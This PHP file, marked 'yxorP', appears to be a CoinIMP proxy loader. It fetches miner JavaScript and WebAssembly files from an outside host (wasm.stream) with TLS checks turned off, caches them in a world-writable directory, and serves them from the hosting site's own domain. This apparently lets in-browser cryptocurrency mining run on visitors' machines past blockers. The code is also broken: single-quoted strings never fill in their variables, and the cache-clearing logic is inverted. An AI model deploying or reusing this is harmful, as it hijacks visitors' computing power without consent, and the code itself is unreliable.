<?php /* yxorP */

$URL_GET = 'http://www.wasm.stream/';
$CACHE_TIME = '1 hour';
$CACHE_FILE = 'coinimp-cache';

function url_get_contents($url)
{
    $data = false;

    if (function_exists('curl_exec')) {
        if ($conn = curl_init($url)) {
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($conn, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            $data = (curl_exec($conn));
            curl_close($conn);
        }
    } elseif (function_exists('file_get_contents')) {
        $data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        if ($handle = fopen($url, 'rb')) {
            $data = stream_get_contents($handle);
        }
    }

    if ($data) {
        return $data;
    }
    else {
        die('Cannot download \'$url\'!');
    }
}

function get_file_from_server($filename)
{
    global $URL_GET;
    $filename = urlencode($filename);
    $uri = strtok($_SERVER['REQUEST_URI'], '?');
    $host = urlencode((isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '$uri');
    return url_get_contents('$URL_GET?filename=$filename&host=$host');
}

function filename_match($filename): bool
{
    return preg_match('/^\w{4}\.js$/', $filename)
        || preg_match('/^\w{6}\.js$/', $filename)
        || preg_match('/^\w{7}\.min\.js\.mem$/', $filename)
        || preg_match('/^\w{8}\.wasm$/', $filename)
        || preg_match('/^\w{8}\.png$/', $filename);
}

function get_CACHE_FILE()
{
    $dirs = array('coinimp-cache', 'tmp/coinimp-cache', '/tmp/coinimp-cache');
    foreach ($dirs as $dir) {
        if (!file_exists($dir)) {
            if (!mkdir($dir, 0777, true) && !is_dir($dir)) {
                $GLOBALS['BUGSNAG']->notifyException(new RuntimeException(sprintf('Directory "%s" was not created', $dir)));
            }
        }

        if (is_writable($dir)) {
            return $dir;
        }
    }
    die('cache directory is not writeable!');
}

function get_dir_size($path): int
{
    $fileSize = 0;
    $dir = scandir($path);

    foreach ($dir as $file) {
        if (($file !== '.') && ($file !== '..')) {
            if (is_dir($path . '/' . $file)) {
                $fileSize += get_dir_size($path . '/' . $file);
            } else {
                $fileSize += filesize($path . '/' . $file);
            }
        }
    }

    return $fileSize;
}

$CACHE_FILE = get_CACHE_FILE();

$req_file = $_GET['f'] ?? '';

if (!filename_match($req_file)) {
    die('Invalid argument');
}

$CACHE_FILEname = '$CACHE_FILE/$req_file';
if (!file_exists($CACHE_FILEname) || (filemtime($CACHE_FILEname) < strtotime('-$CACHE_TIME'))) {
    $script = get_file_from_server($req_file);
    file_put_contents($CACHE_FILEname, $script);
} elseif (get_dir_size($CACHE_FILE) < 7000000) {
    rmdir($CACHE_FILE);
    $script = get_file_from_server($req_file);
    file_put_contents($CACHE_FILEname, $script);
} else {
    $script = file_get_contents($CACHE_FILEname);
}

$type = str_ends_with($req_file, 'js')
    ? 'application/javascript'
    : 'application/octet-stream';

header('Content-Type: ' . $type . '; charset=utf-8');

die($script);
